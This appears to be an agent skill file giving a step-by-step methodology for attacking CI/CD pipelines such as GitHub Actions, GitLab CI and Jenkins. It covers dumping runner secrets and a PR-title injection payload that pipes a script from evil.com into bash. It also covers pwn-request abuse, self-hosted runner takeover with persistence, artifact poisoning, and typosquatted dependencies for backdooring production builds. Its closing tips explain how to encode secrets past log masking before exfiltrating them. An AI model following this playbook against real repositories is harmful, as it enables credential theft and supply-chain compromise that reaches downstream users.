---
name: cicd-technique
description: "CI/CD supply chain methodology: identifying poisoned pipelines, unsafe GitHub Actions, and extracting build secrets."
---

# cicd-technique

**Goal**: Exploit CI/CD pipelines (GitHub Actions, GitLab CI, Jenkins) to achieve code execution in runners, extract pipeline secrets, or backdoor production artifacts.

## When this technique applies
- Evaluating a repository for supply chain vulnerabilities.
- Gained access to a repository with write permissions to Pull Requests, Issues, or Wiki.
- Compromised a CI/CD runner container.

## The Execution Workflow

### 1. Runner Context Enumeration
If you achieved execution within a pipeline step (e.g., via Poisoned PR):
- **Dump secrets**: Run `env`, search for `AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN`, or `$NPM_TOKEN`.
- **Identity**: For GitHub, investigate `ACTIONS_ID_TOKEN_REQUEST_URL` for OIDC (OpenID Connect) trust to AWS/GCP/Azure.

### 2. Identifying Injection Vectors
Review the pipeline configuration files (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`).
- **Untrusted Input in Scripts**: Look for `run:` blocks that echo/execute issue names, PR titles, or commit messages without sanitization:
  ```yaml
  - run: echo "Checking PR title: ${{ github.event.pull_request.title }}"
  ```
  *(A PR titled `"; curl http://evil.com/shell.sh | bash; "` will execute).*
- **`pull_request_target` Abuse ("pwn request")**: Workflows using `pull_request_target` run with elevated repository permissions and access to secrets. If they explicitly check out the fork's `head` (`ref: ${{ github.event.pull_request.head.sha }}`) and then run `npm install`, `make`, or any build step, attacker code executes with the workflow's full privileges.
- **Self-Hosted Runner Takeover**: Non-ephemeral self-hosted runners on public repos are compromised by submitting a PR that adds a job with `runs-on: self-hosted`. The first-time contributor gate can be bypassed once any prior PR is merged; the runner then executes attacker code, and persistence (cron/systemd/`.bashrc`) is often possible because the runner reuses the same workspace between jobs. Named 2024 cases: PyTorch, TensorFlow, Microsoft DeepSpeed.
- **Artifact Poisoning**: A low-privilege workflow (fork PR) uploads a malicious artifact; a later privileged workflow downloads it and executes/extracts it. Watch for `actions/download-artifact` without `github-token` + `run-id` pinning, and `dawidd6/action-download-artifact` <v6 (searches forks by default — GHSA-5xr6-xhww-33m4). Also `actions/download-artifact` <4.1.3 has arbitrary-file-write on extraction (GHSA-cxww-7g56-2vh6).

### 3. Pipeline Poisoning (Artifacts)
- Identify if the pipeline builds the production Docker image or binaries.
- If you can push code or control dependencies (e.g., typosquatting `package.json`), you can implant backdoors natively into the production deployment cycle.

## Quality Gates
- **Beware of Production Impact**: Do not blindly merge poisoned Pull Requests into main. Injecting a backdoor into a build pipeline will trigger incident response or deploy malware to live customers. Keep proofs restricted to harmless `env | grep` outputs (secrets are log-masked; base64/hex-encode before exfil) sent to an out-of-band (OAST) collector.
- **Avoid Credential Rolling**: Only read CI/CD secrets. Do NOT rotate or regenerate them, as it will break the production pipeline completely.
